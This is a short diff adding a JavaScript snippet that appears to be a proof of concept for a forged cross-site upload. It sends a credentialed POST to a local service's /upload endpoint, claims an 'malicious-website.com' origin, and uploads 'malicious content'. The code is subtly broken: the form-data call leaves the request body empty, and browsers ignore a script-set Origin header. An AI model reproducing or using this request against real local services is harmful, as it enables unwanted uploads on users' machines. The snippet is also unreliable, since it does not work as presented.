@@ -1,0 +1,10 @@
+```javascript
+fetch('http://localhost:7860/upload', {
+    method: 'POST',
+    credentials: 'include',
+    body: new FormData().append('file', new Blob(['malicious content'], { type: 'text/plain' })),
+    headers: {
+        'Origin': 'http://malicious-website.com'
+    }
+});
+```
